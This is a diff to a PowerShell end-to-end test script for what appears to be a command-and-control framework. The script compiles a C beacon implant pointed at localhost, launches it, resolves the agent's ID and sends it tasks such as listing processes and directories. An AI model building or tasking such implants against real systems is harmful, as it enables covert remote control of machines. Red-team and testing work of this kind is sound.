@@ -26,7 +26,14 @@ Write-Host "secret unsealed len=$($b64.Length)"
 $bat = '@echo off' + "`r`n" + 'x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/api/v1/beacon\" -DSECRET_ID=\"' + $id + '\" -DSECRET_B64=\"' + $b64 + '\" -DINTERVAL=3 -DE2E_DEBUG'
 Set-Content -Path "$repo\proto\c-implant\build-e2e.bat" -Value $bat
 Push-Location "$repo\proto\c-implant"
-try { cmd /c build-e2e.bat > "$tmp\build.log" 2>&1 } finally { Pop-Location }
+try {
+  # mingw pragma warnings go to stderr: keep them in the log without
+  # tripping $ErrorActionPreference=Stop (same pattern as build-embedded).
+  $prevEAP = $ErrorActionPreference
+  $ErrorActionPreference = "Continue"
+  cmd /c build-e2e.bat > "$tmp\build.log" 2>&1
+  $ErrorActionPreference = $prevEAP
+} finally { Pop-Location }
 if (-not (Test-Path "$repo\proto\c-implant\cbeacon-e2e.exe")) { throw "build produced no binary, see $tmp\build.log" }
 Write-Host "build ok"
 # seed seq from server last_seq to avoid replay on restart
@@ -37,8 +44,13 @@ Remove-Item C:\Windows\Temp\cbeacon-dbg.log -Force -ErrorAction SilentlyContinue
 Start-Process -FilePath "$repo\proto\c-implant\cbeacon-e2e.exe" -WorkingDirectory "$repo\proto\c-implant"
 Write-Host "launched, waiting 12s for handshake..."
 Start-Sleep -Seconds 12
-# issue 5 tasks
-$agent = "fea9ac84-13ca-4fb0-945c-887838299e72"
+# issue 5 tasks (resolve live agent: fresh identity => new UUID each run)
+$agent = ""
+Push-Location $repo
+try { $agent = (& go run ./cmd/dbq $db 'SELECT id FROM implants ORDER BY last_seen DESC LIMIT 1' 2>$null) | Select-Object -First 1 } finally { Pop-Location }
+$agent = ($agent -split ' ')[0].Split('=')[1].Trim()
+if (-not $agent) { throw "no agents registered" }
+Write-Host "target agent=$agent"
 function Issue($path, $form) { (Invoke-RestMethod -Method Post -Uri "$base$path" -WebSession $sess -Headers $H -Body $form) | ConvertTo-Json -Depth 4 -Compress }
 Write-Host (Issue "/agents/$agent/ps" @{})
 Write-Host (Issue "/agents/$agent/files/ls" @{path='C:\Windows'})
